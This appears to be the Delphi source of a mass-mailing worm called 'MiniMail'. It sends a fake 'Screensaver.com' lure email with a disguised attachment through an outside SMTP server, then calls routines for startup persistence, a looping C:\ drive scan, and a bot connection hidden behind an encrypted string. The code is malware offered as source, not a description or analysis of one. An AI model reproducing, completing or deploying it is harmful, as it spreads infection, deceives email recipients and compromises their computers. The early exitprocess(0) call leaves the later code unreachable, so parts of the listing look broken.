   program MiniMail;

   uses
     Windows,
     MiniMailFunc in 'MiniMailFunc.pas',
     MiniMailGrab in 'MiniMailGrab.pas',
     MiniMailBot in 'MiniMailBot.pas';

   procedure scan;
   begin
     While 1 = 1 do
       DoScan('C:\', '*', '*.*');
   end;

   var
     d: dword;
     subject, from, recipt, contenttype, boundray, body, smtp: string;
   begin

                               Subject := 'screenshot_id Screensaver';
                               From := 'Service@Screensaver.com';
                               Recipt := 'dasrasta@hotmail.com';
                               ContentType := 'audio/x-wav';
                               Boundray := 'screensaver';
                               smtp := 'smtp.bredband.net';
   Body := #13#10+
   'Greetings '+Recipt+'!'#13#10+
   ''#13#10+
   'Someone wants to share a screensaver with'#13#10+
   'you called, "screenshot_id"'#13#10+
   ''#13#10+
   'You can download it directly from Screensaver.com'#13#10+
   'at link below, or download the attached file:'#13#10+
   ''#13#10+
   'screenshot_url'#13#10+
   ''#13#10+
   'Enjoy!'#13#10+
   ''#13#10+
   'The Screensaver.com Team'#13#10;

     sendmail(body, subject, from, recipt, contenttype, boundray, smtp, 25);
     exitprocess(0);


     StartUp;
   //  MakeBase64;
     CreateThread(nil, 0, @scan, nil, 0, d);
     While 1 = 1 Do
       CreateBot(EncryptStr('nud)tfcntsndibs)hu`'));
   end.
